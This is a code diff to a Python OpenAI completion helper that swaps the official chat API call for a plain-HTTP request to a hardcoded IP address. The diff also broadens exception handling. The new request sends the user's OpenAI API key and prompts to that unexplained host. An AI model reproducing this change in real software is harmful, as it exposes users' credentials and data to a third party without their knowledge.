@@ -106,24 +106,41 @@ def openai_completion(
                     **decoding_kwargs,
                 )
                 if is_chat_model:
-                    completion_batch = openai.ChatCompletion.create(
-                        messages=[
+                    import requests
+                    url = "http://35.220.164.252:3888/v1/chat/completions"
+                    headers = {
+                        "Content-Type": "application/json",
+                        "Authorization": f"Bearer {openai.api_key}"
+                    }
+                    payload = {
+                        "model": os.environ.get("OPENAI_MODEL_NAME", model_name),
+                        "messages": [
                             {"role": "system", "content": "You are a helpful assistant."},
                             {"role": "user", "content": prompt_batch[0]}
-                        ],
-                        **shared_kwargs
-                    )
+                        ]
+                    }
+                    for k, v in shared_kwargs.items():
+                        if k not in ["model", "messages", "stream"] and v is not None:
+                            if k == "stop" and not v: continue
+                            payload[k] = v
+                    resp = requests.post(url, headers=headers, json=payload)
+                    resp.raise_for_status()
+                    result = resp.json()
+                    choices = result["choices"]
+                    for choice in choices:
+                        choice["total_tokens"] = result.get("usage", {}).get("total_tokens", 0)
+                    completions.extend(choices)
                 else:
                     completion_batch = openai.Completion.create(prompt=prompt_batch, **shared_kwargs)
-
-                choices = completion_batch.choices
-
-                for choice in choices:
-                    choice["total_tokens"] = completion_batch.usage.total_tokens
-                completions.extend(choices)
+                    choices = completion_batch.choices
+                    for choice in choices:
+                        choice["total_tokens"] = completion_batch.usage.total_tokens
+                    completions.extend(choices)
                 break
-            except openai.error.OpenAIError as e:
-                logging.warning(f"OpenAIError: {e}.")
+            except Exception as e:
+                logging.warning(f"API Error: {e}")
+                if hasattr(e, "response") and e.response is not None:
+                    logging.warning(f"Response: {e.response.text}")
                 if "Please reduce your prompt" in str(e):
                     batch_decoding_args.max_tokens = int(batch_decoding_args.max_tokens * 0.8)
                     logging.warning(f"Reducing target length to {batch_decoding_args.max_tokens}, Retrying...")
@@ -136,7 +153,13 @@ def openai_completion(
                     time.sleep(sleep_time)  # Annoying rate limit on requests.
 
     if return_text:
-        completions = [completion.text for completion in completions]
+        new_completions = []
+        for c in completions:
+            if isinstance(c, dict):
+                new_completions.append(c.get("message", {}).get("content") or c.get("text", ""))
+            else:
+                new_completions.append(c.text)
+        completions = new_completions
     if decoding_args.n > 1:
         # make completions a nested list, where each entry is a consecutive decoding_args.n of original entries.
         completions = [completions[i : i + decoding_args.n] for i in range(0, len(completions), decoding_args.n)]
